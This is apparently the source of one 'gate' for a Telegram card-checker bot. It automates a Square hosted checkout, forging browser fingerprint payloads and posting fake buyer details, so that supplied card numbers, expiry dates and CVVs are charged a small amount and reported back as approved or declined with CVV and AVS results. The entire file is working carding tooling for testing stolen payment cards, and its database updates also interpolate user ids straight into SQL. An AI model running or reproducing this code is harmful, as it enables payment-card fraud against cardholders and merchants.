import requests, time, datetime, sys
sys.path.append('/checker/')
from Commands import Postgre, Staff
from Commands.Tools.addr import fake


def div(cc:str) -> str:
    if cc[0] == 3:
        n1 = cc[0:3]
        n2 = cc[4:10]
        n3 = cc[11:]
        return f"{n1} {n2} {n3}"
    else:
        n1 = cc[0:4]
        n2 = cc[4:8]
        n3 = cc[8:12]
        n4 = cc[12:]
        return f"{n1} {n2} {n3} {n4}"



def gate(cc:list, _bin:dict, edit:dict, bot:object) -> dict:
    RESPONSES = ['insufficient funds', '']
    data      = fake('us')['response']
    proxy     = Postgre.proxy()
    month = cc[1] if int(cc[1]) >= 10 else cc[1].replace('0', '')
    card  = div(cc[0])
    curl = requests.session()
    
    try:
        a = bot.editMessage(text = f"<b><i>$ Fetching Data_ ⛈</i></b>\n<b><i><u>Status: </u></i></b> <code>Preparing!</code> 🟨", message_id = edit['message_id'], chat_id = edit['chat_id'])

        #//! Requests 1
        request1 = curl.get(url = 'https://checkout.square.site/merchant/GRTY2GVWAVAP7/checkout/HARVZO5UY42GGD4TBEKYIPQK').text
        location  = Staff.captureCatch(request1, '"present_at_location_ids":["', '"')
        bot.raise_post(location)
    
        #//! Request2 
        headers2 = {'Accept':'application/json, text/plain, */*', 'Content-Type':'application/json', 'Referer':'https://checkout.square.site/merchant/GRTY2GVWAVAP7/checkout/HARVZO5UY42GGD4TBEKYIPQK', 'Origin':'https://checkout.square.site'}
        payload2 = '{"buyerControlledPrice":{"amount":100,"currency":"USD","precision":2},"subscriptionPlanId":null,"oneTimePayment":true,"itemCustomizations":[]}'
        request2 = curl.post(url = 'https://checkout.square.site/api/merchant/YHSF5YJ9B487Z/checkout/P3HHZNFL432BXK5QSTJUQQJQ', headers = headers2, data = payload2).json()
        order_id = request2['order']['id']
        app_id   = request2['order']['creator_app_id']   

        #//! Request 3
        request3 = curl.get(url = f'https://checkout.square.site/api/soc-platform/merchant/YHSF5YJ9B487Z/location/{location}/order/{order_id}/').json()
        owner_id = request3['order']['metadata']['tracking']['owner_id']
        site_id  = request3['order']['metadata']['tracking']['site_id']
        source_i = request3['order']['metadata']['tracking']['source_site_id']
        
        a = bot.editMessage(text = f"<b><i>$ Fetching Data_ ⛈</i></b>\n<b><i><u>Status: </u></i></b> <code>Processing!</code> 🟨", message_id = a['message_id'], chat_id = a['chat_id'])
        
        #//! Request 4
        request4 = curl.get(url = f'https://pci-connect.squareup.com/payments/hydrate?applicationId={app_id}&hostname=checkout.square.site&locationId={location}&version=1.45.0').json()
        session_ = request4['sessionId']
        token_av = request4['avt']
        instance = request4['instanceId']
        
        #//! Request 5
        request5 = curl.get(url = 'https://connect.squareup.com/payments/data/frame.html?referer=https://checkout.square.site/merchant/GRTY2GVWAVAP7/checkout/HARVZO5UY42GGD4TBEKYIPQK')
        
        #//! Request 6
        headers6 = {'Accept':'*/*', 'Content-Type':'application/json', 'Origin':'https://connect.squareup.com', 'Referer':'https://connect.squareup.com/payments/data/frame.html?referer=https%3A%2F%2Fcheckout.square.site%2Fmerchant%2FYHSF5YJ9B487Z%2Fcheckout%2FP3HHZNFL432BXK5QSTJUQQJQ'}
        payload6 = '{"components":"{\\"user_agent\\":\\"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0\\",\\"language\\":\\"es-MX\\",\\"color_depth\\":24,\\"resolution\\":[1708,960],\\"available_resolution\\":[1708,960],\\"timezone_offset\\":360,\\"session_storage\\":1,\\"local_storage\\":1,\\"cpu_class\\":\\"unknown\\",\\"navigator_platform\\":\\"Win32\\",\\"do_not_track\\":\\"unspecified\\",\\"regular_plugins\\":[\\"PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\\",\\"Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\\",\\"Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\\",\\"Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\\",\\"WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf\\"],\\"adblock\\":false,\\"has_lied_languages\\":false,\\"has_lied_resolution\\":false,\\"has_lied_os\\":false,\\"has_lied_browser\\":false,\\"touch_support\\":[0,false,false],\\"js_fonts\\":[\\"Arial\\",\\"Arial Black\\",\\"Arial Narrow\\",\\"Arial Rounded MT Bold\\",\\"Book Antiqua\\",\\"Bookman Old Style\\",\\"Calibri\\",\\"Cambria\\",\\"Cambria Math\\",\\"Century\\",\\"Century Gothic\\",\\"Century Schoolbook\\",\\"Comic Sans MS\\",\\"Consolas\\",\\"Courier\\",\\"Courier New\\",\\"Garamond\\",\\"Georgia\\",\\"Helvetica\\",\\"Impact\\",\\"Lucida Bright\\",\\"Lucida Calligraphy\\",\\"Lucida Console\\",\\"Lucida Fax\\",\\"Lucida Handwriting\\",\\"Lucida Sans\\",\\"Lucida Sans Typewriter\\",\\"Lucida Sans Unicode\\",\\"Microsoft Sans Serif\\",\\"Monotype Corsiva\\",\\"MS Gothic\\",\\"MS Outlook\\",\\"MS PGothic\\",\\"MS Reference Sans Serif\\",\\"MS Sans Serif\\",\\"MS Serif\\",\\"Palatino Linotype\\",\\"Segoe Print\\",\\"Segoe Script\\",\\"Segoe UI\\",\\"Segoe UI Light\\",\\"Segoe UI Semibold\\",\\"Segoe UI Symbol\\",\\"Tahoma\\",\\"Times\\",\\"Times New Roman\\",\\"Trebuchet MS\\",\\"Verdana\\",\\"Wingdings\\",\\"Wingdings 2\\",\\"Wingdings 3\\"]}","fingerprint":"662a584d6761efec2db97d98dd78c413","version":"e9a347c4e598d7b4ba217eaa000f6e332e570f08","website_url":"https://checkout.square.site/","client_id":"'+app_id+'","browser_fingerprint_by_version":[{"payload_json":"{\\"components\\":{\\"user_agent\\":\\"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0\\",\\"language\\":\\"es-MX\\",\\"color_depth\\":24,\\"resolution\\":[1708,960],\\"available_resolution\\":[1708,960],\\"timezone_offset\\":360,\\"session_storage\\":1,\\"local_storage\\":1,\\"cpu_class\\":\\"unknown\\",\\"navigator_platform\\":\\"Win32\\",\\"do_not_track\\":\\"unspecified\\",\\"regular_plugins\\":[\\"PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\\",\\"Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\\",\\"Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\\",\\"Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\\",\\"WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf\\"],\\"adblock\\":false,\\"has_lied_languages\\":false,\\"has_lied_resolution\\":false,\\"has_lied_os\\":false,\\"has_lied_browser\\":false,\\"touch_support\\":[0,false,false],\\"js_fonts\\":[\\"Arial\\",\\"Arial Black\\",\\"Arial Narrow\\",\\"Arial Rounded MT Bold\\",\\"Book Antiqua\\",\\"Bookman Old Style\\",\\"Calibri\\",\\"Cambria\\",\\"Cambria Math\\",\\"Century\\",\\"Century Gothic\\",\\"Century Schoolbook\\",\\"Comic Sans MS\\",\\"Consolas\\",\\"Courier\\",\\"Courier New\\",\\"Garamond\\",\\"Georgia\\",\\"Helvetica\\",\\"Impact\\",\\"Lucida Bright\\",\\"Lucida Calligraphy\\",\\"Lucida Console\\",\\"Lucida Fax\\",\\"Lucida Handwriting\\",\\"Lucida Sans\\",\\"Lucida Sans Typewriter\\",\\"Lucida Sans Unicode\\",\\"Microsoft Sans Serif\\",\\"Monotype Corsiva\\",\\"MS Gothic\\",\\"MS Outlook\\",\\"MS PGothic\\",\\"MS Reference Sans Serif\\",\\"MS Sans Serif\\",\\"MS Serif\\",\\"Palatino Linotype\\",\\"Segoe Print\\",\\"Segoe Script\\",\\"Segoe UI\\",\\"Segoe UI Light\\",\\"Segoe UI Semibold\\",\\"Segoe UI Symbol\\",\\"Tahoma\\",\\"Times\\",\\"Times New Roman\\",\\"Trebuchet MS\\",\\"Verdana\\",\\"Wingdings\\",\\"Wingdings 2\\",\\"Wingdings 3\\"]},\\"fingerprint\\":\\"662a584d6761efec2db97d98dd78c413\\"}","payload_type":"fingerprint-v1"},{"payload_json":"{\\"components\\":{\\"language\\":\\"es-MX\\",\\"color_depth\\":24,\\"resolution\\":[1708,960],\\"available_resolution\\":[1708,960],\\"timezone_offset\\":360,\\"session_storage\\":1,\\"local_storage\\":1,\\"cpu_class\\":\\"unknown\\",\\"navigator_platform\\":\\"Win32\\",\\"do_not_track\\":\\"unspecified\\",\\"regular_plugins\\":[\\"PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\\",\\"Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\\",\\"Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\\",\\"Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\\",\\"WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf\\"],\\"adblock\\":false,\\"has_lied_languages\\":false,\\"has_lied_resolution\\":false,\\"has_lied_os\\":false,\\"has_lied_browser\\":false,\\"touch_support\\":[0,false,false],\\"js_fonts\\":[\\"Arial\\",\\"Arial Black\\",\\"Arial Narrow\\",\\"Arial Rounded MT Bold\\",\\"Book Antiqua\\",\\"Bookman Old Style\\",\\"Calibri\\",\\"Cambria\\",\\"Cambria Math\\",\\"Century\\",\\"Century Gothic\\",\\"Century Schoolbook\\",\\"Comic Sans MS\\",\\"Consolas\\",\\"Courier\\",\\"Courier New\\",\\"Garamond\\",\\"Georgia\\",\\"Helvetica\\",\\"Impact\\",\\"Lucida Bright\\",\\"Lucida Calligraphy\\",\\"Lucida Console\\",\\"Lucida Fax\\",\\"Lucida Handwriting\\",\\"Lucida Sans\\",\\"Lucida Sans Typewriter\\",\\"Lucida Sans Unicode\\",\\"Microsoft Sans Serif\\",\\"Monotype Corsiva\\",\\"MS Gothic\\",\\"MS Outlook\\",\\"MS PGothic\\",\\"MS Reference Sans Serif\\",\\"MS Sans Serif\\",\\"MS Serif\\",\\"Palatino Linotype\\",\\"Segoe Print\\",\\"Segoe Script\\",\\"Segoe UI\\",\\"Segoe UI Light\\",\\"Segoe UI Semibold\\",\\"Segoe UI Symbol\\",\\"Tahoma\\",\\"Times\\",\\"Times New Roman\\",\\"Trebuchet MS\\",\\"Verdana\\",\\"Wingdings\\",\\"Wingdings 2\\",\\"Wingdings 3\\"]},\\"fingerprint\\":\\"d144b5aba7c7ae9eb99a46ecc29b4bbc\\"}","payload_type":"fingerprint-v1-sans-ua"}]}'
        request6 = curl.post(url = 'https://connect.squareup.com/v2/analytics/token', headers = headers6, data = payload6).json()
        token_an = request6['token']

        a = bot.editMessage(text = f"<b><i>$ Fetching Data_ ⛈</i></b>\n<b><i><u>Status: </u></i></b> <code>Checking!</code> 🟨", message_id = a['message_id'], chat_id = a['chat_id'])

        #//! Request 7 
        headers7 = {'Accept':'application/json', 'content-type':'application/json; charset=utf-8', 'Origin':'https://web.squarecdn.com', 'Referer':'https://web.squarecdn.com/'}
        payload7 = '{"client_id":"'+app_id+'","location_id":"'+location+'","payment_method_tracking_id":"141a119b-cfb1-80a3-7749-2604bb5c0056","session_id":"'+session_+'","website_url":"checkout.square.site","analytics_token":"'+token_an+'","card_data":{"billing_postal_code":"10010","cvv":"'+cc[3]+'","exp_month":'+month+',"exp_year":'+cc[2]+',"number":"'+cc[0]+'"}}'
        request7 = curl.post(url = 'https://pci-connect.squareup.com/v2/card-nonce?_=1669577279932.5786&version=1.45.0', headers = headers7, data = payload7).json()
        token_cn = request7['card_nonce']

        #//! Request 8
        headers8 = {'Accept':'application/json, text/plain, */*', 'Content-Type':'application/json', 'Origin':'https://checkout.square.site', 'Referer':'https://checkout.square.site/merchant/GRTY2GVWAVAP7/checkout/HARVZO5UY42GGD4TBEKYIPQK'}
        payload8 = '{"given_name":"'+data['f_name']+' ","family_name":"'+data['l_name']+'","email_address":"'+data['f_name']+''+data['l_name']+'123@gmail.com","phone_number":{"national_number":"4435672010","region_code":"US","country_code":"1","formatted":""},"shipping_address":{"first_name":"'+data['f_name']+' ","last_name":"'+data['l_name']+'","phone":{"national_number":"4435672010","region_code":"US","country_code":"1","formatted":""},"label":"Shipping"}}'
        request8 = curl.patch(url = f'https://checkout.square.site/api/soc-platform/merchant/YHSF5YJ9B487Z/location/{location}/order/{order_id}/customer', headers = headers8, data = payload8)
        
        #//! Request 8
        headers9 = {'Accept':'application/json', 'content-type':'application/json; charset=utf-8', 'Origin':'https://connect.squareup.com', 'Referer':'https://connect.squareup.com/payments/data/frame.html?referer=https%3A%2F%2Fcheckout.square.site%2Fmerchant%2FYHSF5YJ9B487Z%2Fcheckout%2FP3HHZNFL432BXK5QSTJUQQJQ'}
        payload9 = '{"browser_fingerprint_by_version":[{"payload_json":"{\\"components\\":{\\"user_agent\\":\\"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0\\",\\"language\\":\\"es-MX\\",\\"color_depth\\":24,\\"resolution\\":[1708,960],\\"available_resolution\\":[1708,960],\\"timezone_offset\\":360,\\"session_storage\\":1,\\"local_storage\\":1,\\"cpu_class\\":\\"unknown\\",\\"navigator_platform\\":\\"Win32\\",\\"do_not_track\\":\\"unspecified\\",\\"regular_plugins\\":[\\"PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\\",\\"Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\\",\\"Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\\",\\"Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\\",\\"WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf\\"],\\"adblock\\":false,\\"has_lied_languages\\":false,\\"has_lied_resolution\\":false,\\"has_lied_os\\":false,\\"has_lied_browser\\":false,\\"touch_support\\":[0,false,false],\\"js_fonts\\":[\\"Arial\\",\\"Arial Black\\",\\"Arial Narrow\\",\\"Arial Rounded MT Bold\\",\\"Book Antiqua\\",\\"Bookman Old Style\\",\\"Calibri\\",\\"Cambria\\",\\"Cambria Math\\",\\"Century\\",\\"Century Gothic\\",\\"Century Schoolbook\\",\\"Comic Sans MS\\",\\"Consolas\\",\\"Courier\\",\\"Courier New\\",\\"Garamond\\",\\"Georgia\\",\\"Helvetica\\",\\"Impact\\",\\"Lucida Bright\\",\\"Lucida Calligraphy\\",\\"Lucida Console\\",\\"Lucida Fax\\",\\"Lucida Handwriting\\",\\"Lucida Sans\\",\\"Lucida Sans Typewriter\\",\\"Lucida Sans Unicode\\",\\"Microsoft Sans Serif\\",\\"Monotype Corsiva\\",\\"MS Gothic\\",\\"MS Outlook\\",\\"MS PGothic\\",\\"MS Reference Sans Serif\\",\\"MS Sans Serif\\",\\"MS Serif\\",\\"Palatino Linotype\\",\\"Segoe Print\\",\\"Segoe Script\\",\\"Segoe UI\\",\\"Segoe UI Light\\",\\"Segoe UI Semibold\\",\\"Segoe UI Symbol\\",\\"Tahoma\\",\\"Times\\",\\"Times New Roman\\",\\"Trebuchet MS\\",\\"Verdana\\",\\"Wingdings\\",\\"Wingdings 2\\",\\"Wingdings 3\\"]},\\"fingerprint\\":\\"662a584d6761efec2db97d98dd78c413\\"}","payload_type":"fingerprint-v1"},{"payload_json":"{\\"components\\":{\\"language\\":\\"es-MX\\",\\"color_depth\\":24,\\"resolution\\":[1708,960],\\"available_resolution\\":[1708,960],\\"timezone_offset\\":360,\\"session_storage\\":1,\\"local_storage\\":1,\\"cpu_class\\":\\"unknown\\",\\"navigator_platform\\":\\"Win32\\",\\"do_not_track\\":\\"unspecified\\",\\"regular_plugins\\":[\\"PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\\",\\"Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\\",\\"Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\\",\\"Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\\",\\"WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf\\"],\\"adblock\\":false,\\"has_lied_languages\\":false,\\"has_lied_resolution\\":false,\\"has_lied_os\\":false,\\"has_lied_browser\\":false,\\"touch_support\\":[0,false,false],\\"js_fonts\\":[\\"Arial\\",\\"Arial Black\\",\\"Arial Narrow\\",\\"Arial Rounded MT Bold\\",\\"Book Antiqua\\",\\"Bookman Old Style\\",\\"Calibri\\",\\"Cambria\\",\\"Cambria Math\\",\\"Century\\",\\"Century Gothic\\",\\"Century Schoolbook\\",\\"Comic Sans MS\\",\\"Consolas\\",\\"Courier\\",\\"Courier New\\",\\"Garamond\\",\\"Georgia\\",\\"Helvetica\\",\\"Impact\\",\\"Lucida Bright\\",\\"Lucida Calligraphy\\",\\"Lucida Console\\",\\"Lucida Fax\\",\\"Lucida Handwriting\\",\\"Lucida Sans\\",\\"Lucida Sans Typewriter\\",\\"Lucida Sans Unicode\\",\\"Microsoft Sans Serif\\",\\"Monotype Corsiva\\",\\"MS Gothic\\",\\"MS Outlook\\",\\"MS PGothic\\",\\"MS Reference Sans Serif\\",\\"MS Sans Serif\\",\\"MS Serif\\",\\"Palatino Linotype\\",\\"Segoe Print\\",\\"Segoe Script\\",\\"Segoe UI\\",\\"Segoe UI Light\\",\\"Segoe UI Semibold\\",\\"Segoe UI Symbol\\",\\"Tahoma\\",\\"Times\\",\\"Times New Roman\\",\\"Trebuchet MS\\",\\"Verdana\\",\\"Wingdings\\",\\"Wingdings 2\\",\\"Wingdings 3\\"]},\\"fingerprint\\":\\"d144b5aba7c7ae9eb99a46ecc29b4bbc\\"}","payload_type":"fingerprint-v1-sans-ua"}],"browser_profile":{"components":"{\\"user_agent\\":\\"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0\\",\\"language\\":\\"es-MX\\",\\"color_depth\\":24,\\"resolution\\":[1708,960],\\"available_resolution\\":[1708,960],\\"timezone_offset\\":360,\\"session_storage\\":1,\\"local_storage\\":1,\\"cpu_class\\":\\"unknown\\",\\"navigator_platform\\":\\"Win32\\",\\"do_not_track\\":\\"unspecified\\",\\"regular_plugins\\":[\\"PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\\",\\"Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\\",\\"Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\\",\\"Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\\",\\"WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf\\"],\\"adblock\\":false,\\"has_lied_languages\\":false,\\"has_lied_resolution\\":false,\\"has_lied_os\\":false,\\"has_lied_browser\\":false,\\"touch_support\\":[0,false,false],\\"js_fonts\\":[\\"Arial\\",\\"Arial Black\\",\\"Arial Narrow\\",\\"Arial Rounded MT Bold\\",\\"Book Antiqua\\",\\"Bookman Old Style\\",\\"Calibri\\",\\"Cambria\\",\\"Cambria Math\\",\\"Century\\",\\"Century Gothic\\",\\"Century Schoolbook\\",\\"Comic Sans MS\\",\\"Consolas\\",\\"Courier\\",\\"Courier New\\",\\"Garamond\\",\\"Georgia\\",\\"Helvetica\\",\\"Impact\\",\\"Lucida Bright\\",\\"Lucida Calligraphy\\",\\"Lucida Console\\",\\"Lucida Fax\\",\\"Lucida Handwriting\\",\\"Lucida Sans\\",\\"Lucida Sans Typewriter\\",\\"Lucida Sans Unicode\\",\\"Microsoft Sans Serif\\",\\"Monotype Corsiva\\",\\"MS Gothic\\",\\"MS Outlook\\",\\"MS PGothic\\",\\"MS Reference Sans Serif\\",\\"MS Sans Serif\\",\\"MS Serif\\",\\"Palatino Linotype\\",\\"Segoe Print\\",\\"Segoe Script\\",\\"Segoe UI\\",\\"Segoe UI Light\\",\\"Segoe UI Semibold\\",\\"Segoe UI Symbol\\",\\"Tahoma\\",\\"Times\\",\\"Times New Roman\\",\\"Trebuchet MS\\",\\"Verdana\\",\\"Wingdings\\",\\"Wingdings 2\\",\\"Wingdings 3\\"]}","fingerprint":"662a584d6761efec2db97d98dd78c413","version":"e9a347c4e598d7b4ba217eaa000f6e332e570f08","website_url":"https://checkout.square.site/"},"client_id":"'+app_id+'","payment_source":"'+token_cn+'","universal_token":{"token":"'+location+'","type":"UNIT"},"verification_details":{"billing_contact":{"country":"US","postal_code":"10010"},"intent":"CHARGE","total":{"amount":100,"currency":"USD"}}}'
        request9 = curl.post(url = 'https://connect.squareup.com/v2/analytics/verifications', headers = headers9, data = payload9).json()
        token_vf = request9['token']

        a = bot.editMessage(text = f"<b><i>$ Fetching Data_ ⛈</i></b>\n<b><i><u>Status: </u></i></b> <code>Checked!</code> 🟩", message_id = a['message_id'], chat_id = a['chat_id'])

        #//! Request 9
        headers10 = {'Accept':'application/json, text/plain, */*', 'Content-Type':'application/json', 'Origin':'https://checkout.square.site', 'Referer':'https://checkout.square.site/merchant/GRTY2GVWAVAP7/checkout/HARVZO5UY42GGD4TBEKYIPQK'}
        payload10 = '{"nonce":"'+token_cn+'","buyer_verification_token":"'+token_vf+'","buyer_postal_code":"10010","create_stored_payment_method":false,"country":"US"}'
        request10 = curl.post(url = f'https://checkout.square.site/api/soc-platform/merchant/YHSF5YJ9B487Z/location/{location}/order/{order_id}/checkout', headers = headers10, data = payload10)
        curl.close()
        
        if request10.status_code == 200:
             return {'status':True, 'response':'<code>Charged $10</code>', 'success':'approved! ✅', 'avs':'','message_id':a['message_id']}
        else:
            r = request10.json()
            message = r['errors'][0]['detail'].replace("'", '') if len(r['errors']) == 1 else r['errors'][1]['detail'].replace("'", '')
            cvv = r['payment']['card_details']['cvv_status']
            avs = r['payment']['card_details']['avs_status']
            if message.lower() in ["authorization error: cvv_failure"]:
                message = f"<b>{message}</b>\n[<a href='https://t.me/Ghidorah_chkbot'>ᚸ</a>] <b><i><u>CVV:</u></i></b> [<b>{cvv}</b>]\n[<a href='https://t.me/Ghidorah_chkbot'>ᚸ</a>] <b><i><u>AVS:</u></i></b> [<b>{avs}</b>]"
                return {'status':True, 'response':message, 'success':'approved! ✅', 'avs':'','message_id':a['message_id']}
            else:
                message = f"<b>{message}</b>\n[<a href='https://t.me/Ghidorah_chkbot'>ᚸ</a>] <b><i><u>CVV:</u></i></b> [<b>{cvv}</b>]\n[<a href='https://t.me/Ghidorah_chkbot'>ᚸ</a>] <b><i><u>AVS:</u></i></b> [<b>{avs}</b>]"
                return {'status':True, 'response':message, 'success':'declined! ❌','avs':'','message_id':a['message_id']}
    except Exception as error:
        bot.raise_post(f"Error en el gate: {str(error)[0:350]}")
        return {'status':False, 'raise':error}



def gateCmd(update, context, bot) -> None:
    bot.sendAction(chat_id = update['chat_id'], action = 'typing')
    a = bot.replyMessage(text=f"<b><i>$ Fetching Data_ ⛈</i></b>\n<b><i><u>Status: </u></i></b> <code>Waiting!</code> 🟥", chat_id = update['chat_id'], reply_id = update['message_id'])
    args = context['args'] if len(context['args']) > 0 else update['reply_to'] if update['reply_to'] != 'None' else context['args']
    args = args if type(args) == str else args['text']
    user = Postgre.view(user_id=update['user_id'])
    chat = Postgre.view(user_id=update['chat_id'])
    cmd  = Postgre.viewCmd(cmd = context['command'])
    b = Staff.gates(user = user, chat =  chat, text = args, cmd = cmd, bot = bot)
    try:    
        if b['status']:
            a = bot.editMessage(text = f"<b><i>$ Fetching Data_ ⛈</i></b>\n<b><i><u>Status: </u></i></b> <code>Checking!</code> 🟧", chat_id = update['chat_id'], message_id = a['message_id'])
            now  = time.time()
            Postgre.update(f"UPDATE users SET l_reg = '{datetime.datetime.now()}' WHERE user_id = '{update['user_id']}'")
            checker = gate(cc = b['cc'], _bin = b['bin'], edit = {'chat_id':update['chat_id'], 'message_id':a['message_id']}, bot = bot)
            if checker['status']:
                a = bot.editMessage(text = f"<b><i>$ {cmd['name'].title()} 🌩</i></b>\n━━━━━━━━━━━━━━━━━\n[<a href='https://t.me/Ghidorah_chkbot'>ᚸ</a>] <b><i><u>Cc:</u></i></b> <code>{b['cc'][0]}|{b['cc'][1]}|{b['cc'][2]}|{b['cc'][3]}</code>\n[<a href='https://t.me/Ghidorah_chkbot'>ᚸ</a>] <b><i><u>Status:</u></i></b> <code>{checker['success'].title()}</code>\n[<a href='https://t.me/Ghidorah_chkbot'>ᚸ</a>] <b><i><u>Response:</u></i></b> {checker['response']}\n\n[<a href='https://t.me/Ghidorah_chkbot'>ᚸ</a>] <b><i><u>Info:</u></i></b> <code>{b['bin']['brand'].title()}</code> - <code>{b['bin']['type'].title()}</code> - <code>{b['bin']['level'].title()}</code>\n[<a href='https://t.me/Ghidorah_chkbot'>ᚸ</a>] <b><i><u>Bank:</u></i></b> <code>{b['bin']['bank'].title()}</code>\n[<a href='https://t.me/Ghidorah_chkbot'>ᚸ</a>] <b><i><u>Country:</u></i></b> <code>{b['bin']['country'].title()}</code>[{b['bin']['flag']}] - <code>{b['bin']['currency'].title()}</code>\n\n[<a href='https://t.me/Ghidorah_chkbot'>ᚸ</a>] <b><i><u>T.Taken:</u></i></b> <code>{str(round((time.time() - now), 1))}'s</code> | <b><i><u>Proxy:</u></i></b> <code>Live[✅]</code>\n[<a href='https://t.me/Ghidorah_chkbot'>ᚸ</a>] <b><i><u>User:</u></i></b> @{update['username']} [<b>{user['c_name'].title()}</b>]\n━━━━━━━━━━━━━━━━━\n[↯] <b><i><u>By:</u></i></b> <code>SoyQuetzal</code> ☁️", chat_id=update['chat_id'], message_id=checker['message_id'])
            else:
                Postgre.update(f"UPDATE users SET l_reg = '{user['l_reg']}' WHERE user_id = '{update['user_id']}'")
                bot.editMessage(text = f"<b><i>$ Wrong Data_ ⚠️</i></b>\n<b><i><u>Raise:</u></i></b> <code>There is a problem, contact an administrator and place recheck!</code>", chat_id = update['chat_id'], message_id = a['message_id'])
        else:
            bot.editMessage(text = f"{b['text']}", chat_id = update['chat_id'], message_id = a['message_id'])
    except Exception as a:
        bot.raise_post(f"Error en pdCMD, {str(a)}")